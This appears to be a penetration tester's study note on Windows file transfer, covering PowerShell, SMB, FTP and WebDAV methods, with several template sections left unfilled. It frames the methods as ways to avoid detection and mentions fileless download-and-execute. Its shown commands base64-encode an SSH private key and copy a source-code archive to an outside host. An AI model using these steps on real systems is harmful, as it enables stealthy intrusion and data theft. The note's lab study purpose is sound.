# Windows File Transfer

## Overview

For transferring files to/from Windows machines.

## Key Concepts

To avoid detection, it's recommended to try to use Windows-native tools to transfer files as much as possible.

## Downloading

### Powershell

#### Method 1: Base64 Encoding

> [!warning] While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings. 

**Step 1:** Check the MD5 hash of the contents.
```bash
md5sum id_rsa
```

**Step 2:** Encode contents to base64 and copy it to clipboard.
```bash
cat id_rsa | base64 -w 0; echo
```

**Step 3:** On the Windows machine, decode the contents in your clipboard to a file.
![[Powershell#^decode-base64-to-file]]

**Step 4:** Confirm the MD5 hash matches
![[Powershell#^get-file-md5-hash]]

#### Method 2:  DownloadFile

Download a file to a specified location.
![[Powershell#^downloadfile-method]]

#### Method 3:  DownloadString - Fileless

Download and execute a remote file in memory - filelessly!
![[Powershell#^downloadstring-method-fileless]]

#### Method 4: Invoke-WebRequest

> [!warning]  `Invoke-WebRequest` is noticeably slower at downloading files than `(New-Object Net.WebClient).DownloadFile`

Download a file to a specified location.
![[Powershell#^outfile-invoke-webrequest]]

---
### SMB

#### Method 1: impacket-smbserver

**Step 1:** Create an SMB server on the Linux machine
![[impacket-smbserver#^create-authenticated-smb-server]]

**Step 2:** Mount the SMB server
```powershell
net use n: \\192.168.220.133\share /user:test test
```

**Step 3:** Copy the file from the share to the Windows machine
```powershell
copy n:\<file>
```

---
### FTP

#### Method 1: pyftpdlib

**Step 1:** Create an FTP server with Python on the Linux machine
![[Python#^create-ftp-server]]

**Step 2:** Download the files to the Windows machine
![[Powershell#^downloadfile-method]]


## Uploading

### Powershell

#### Method 1: Base64 Encoding + Copying

**Step 1:** Check the MD5 hash of the contents.
![[Powershell#^decode-base64-to-file]]

**Step 2:** Encode contents to base64 and copy it to clipboard.
![[Powershell#^encode-file-contents-to-base64]]

**Step 3:** On the Linux machine, decode the contents in your clipboard to a file.
```bash
echo "base64 content" | base64 -d > hosts
```

**Step 4:** Confirm the MD5 hash matches.
```bash
md5sum id_rsa
```

#### Method 2: Base64 Encoding + Uploading

**Step 1:** Encode the file content to Base64 and save it to a variable.
![[Powershell#^b64-file-content-variable]]

**Step 2:** Open a netcat listener on the Linux machine.
![[netcat#^open-listener]]

**Step 3:** Send the Base64 encoded file contents to the listener
![[Powershell#^send-b64-post]]

### FTP

#### Method 1: pyftpdlib

**Step 1:** Create an FTP server with write permissions on the Linux machine.
![[Python#^write-create-ftp-server]]

**Step 2:** Upload a file from the Windows machine.
![[Powershell#^uploadfile-method]]

### HTTP

#### Method 1: uploadserver

Set up a webserver with upload page
![[Python#^uploadserver]]

#### Method 2: wsgidav

**Step 1:** Create a WebDav share on the Linux machine
![[Python#^wsgidav-create-share]]

**Step 2:** Connect to the share on the Windows machine
```powershell
dir \\192.168.49.128\DavWWWRoot
```

**Step 3:** Upload files from the Windows machine
```powershell
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\www\
```





## Practical Examples

Real-world scenarios where I've used this

## Gotchas & Troubleshooting

- Common issues I've encountered
- Things that break this technique
- Environment-specific considerations

## Related Techniques

- [[Similar-Technique]] - How they differ
- [[Follow-up-Technique]] - What comes next

## CTF Examples

```dataview
TABLE file.name as "Box", choice(contains(file.tags, "easy"), "🟢", choice(contains(file.tags, "medium"), "🟡", "🔴")) as "Diff"
FROM "06-CTF-Writeups" AND #windows-file-transfer
SORT file.ctime DESC
LIMIT 5
```

## Learning Resources

- 

#windows-file-transfer #technique